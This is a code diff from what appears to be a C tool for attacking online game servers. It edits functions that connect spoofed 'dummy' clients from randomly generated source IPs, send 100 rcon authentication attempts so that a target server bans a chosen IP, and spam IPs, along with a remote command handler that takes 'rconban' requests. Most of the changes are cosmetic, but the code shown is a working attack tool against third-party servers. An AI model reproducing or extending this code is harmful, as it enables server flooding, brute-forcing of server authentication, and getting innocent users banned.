@@ -186,7 +186,7 @@ USHORT checksum(USHORT *buffer, int size)
 }
 
 
-//debug for packet's data
+/* debug for packet's data */
 void Debug(unsigned char *buffer, int buffersize)
 {
 	int i;
@@ -198,6 +198,7 @@ void Debug(unsigned char *buffer, int buffersize)
 	printf("\n");
 }
 
+/* This one *might* generate invalid IPs quite often. */
 unsigned long genip()
 {
 	unsigned char *p_ip;
@@ -209,7 +210,7 @@ unsigned long genip()
 	return ul_dst;
 }
 
-const char *genIpChar()
+const char *GenIPChar()
 {
 	srand((unsigned)time(0)); 
 	int Oktett[4];
@@ -242,25 +243,13 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 
 	for (int k = 0; k < Amount; k++)
 	{
-		m_FromIP[k] = genip();
+		m_FromIP[k] = inet_addr(GenIPChar());
 	}
-
-	//m_FromIP[0] = inet_addr("192.168.100.10");
-    /*m_FromIP[0] = inet_addr("133.37.133.37");
-	m_FromIP[1]	= inet_addr("111.111.111.111");
-	m_FromIP[2]	= inet_addr("222.222.222.222");
-	m_FromIP[3]	= inet_addr("122.122.122.122");
-	m_FromIP[4]	= inet_addr("133.133.133.133");
-	m_FromIP[5]	= inet_addr("144.144.144.144");
-	m_FromIP[6]	= inet_addr("155.155.155.155");
-	m_FromIP[7]	= inet_addr("166.166.166.166");*/
 
 	m_FromPort = htons(1111);
 
 	m_ToIP = inet_addr(IP);
 	m_ToPort = htons(Port);
-
-	//char message[256];  -- it was for chat ^^
 	unsigned char buffer[2048];
 
 	int BufferSize = 0;
@@ -316,7 +305,6 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 		}
 		Sleep(15)
 	}
-	//Close(0);
 }
 
 void DisconnectDummies()
@@ -391,6 +379,8 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	BufferSize = PackEnterGame(&buffer[0], 0);
 	SendData((const char*)buffer, BufferSize, 0);
 
+	Sleep(100); // short delay right here
+
 	// send the rcon auth's
 	int i;
 	for(i = 0; i < 100; i++)
@@ -408,7 +398,7 @@ void SpamIPs(const char *IP, int Port)
 
 void Tick()
 {
-	if (m_Tick > 500) //once in 500 ms
+	if (m_Tick > 500) // once in 500 ms
 	{
 		m_Tick = 0;
 
@@ -511,7 +501,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					send(g_Client, "[Server]: Please use: rconban <srvip> <srvport> <banip>", strlen("[Server]: Please use: rcon ban <srvip> <srvport> <banip>"), 0);
 			}
 			else
-				send(g_Client, "[Server]: We don't know this cmd. Try again.", strlen("[Server]: We don't know this cmd. Try again."), 0);
+				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
 		}
 	}
 }
